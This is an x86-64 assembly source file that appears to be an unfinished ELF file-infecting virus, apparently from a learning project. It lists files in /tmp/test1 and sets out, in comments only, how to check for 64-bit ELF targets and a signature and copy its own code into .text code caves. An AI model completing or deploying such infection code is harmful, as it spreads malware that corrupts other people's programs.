%include "./src/define.inc"


%define DIRECTORY_BUFFER_SIZE 0x10000
section .scaf align=16 progbits alloc
struc	dirent
    .d_ino:			resq	1
    .d_off:			resq	1
    .d_reclen:		resw	1
    ; char d_name[] - flexible array member, size can be calculated from d_reclen
    .d_name:			resb	1 ; Just a placeholder d_name is variable size null terminated string
    ; pad
    ; d_type (dirent + d_reclen - 1)
endstruc



scaffold_table_num:
    u64 0x1
scaffold_table:
    u64 scaffold_start - scaffold_table_num
    u64 scaffold_end - scaffold_table_num

scaffold_start:
    ; signature: u8 "signature abied-ch & fbruggem", 0x0
    ; signature_len: equ $ - signature

    mov rax, SYS_OPEN
    lea rdi, [rel dir_path]
    mov rsi, O_RDONLY | O_DIRECTORY
    xor rdx, rdx          ; mode — unused when not creating
    syscall

    cmp rax, 0
    jl error

    push rax ; fd

    mov rax, DIRECTORY_BUFFER_SIZE
    call mmap
    push rax

    mov rax, 217
    pop rsi
    pop rdi
    mov rdx, DIRECTORY_BUFFER_SIZE
    push rsi

    syscall

    pop rax



    mov ebx, [rax + dirent.d_recl]
    xor rax, rax
    mov rax, dirent.d_name




    ; Make a loop that runs per file




    ; CALL .infect_file

.infect_file:
    ; validate that it is a 64 bit infectable elf
    ; check if it already has the signature

    ; find .text code cave and check if it's big enough

    ; check if all the code caves are big enough for scaffold
        ; think that you also need space for the whole table that saves the different sections + signature
    
    ; copy builder into the .text codecave make sure that the scaffold doesn't copy over it
    ; copy scaffold into the code caves
    ; DONE





error:
    mov r15, 0x23
    mov rdi, rax
    mov rax, SYS_EXIT
    syscall

; void *mmap(u64 size)
mmap:
    push rax
    mov rax, SYS_MMAP
    mov rdi, 0x0
    pop rsi  
    mov rdx, PROT_READ | PROT_WRITE
    mov r10, MAP_PRIVATE | MAP_ANONYMOUS
    mov r8, -1
    mov r9, 0x0

    syscall
    ; Check if mmap failed
    cmp rax, -1
    je error
    ret


fd_dir u64 0x0
buffer u64 0x0    

dir_path db "/tmp/test1", 0     
scaffold_end: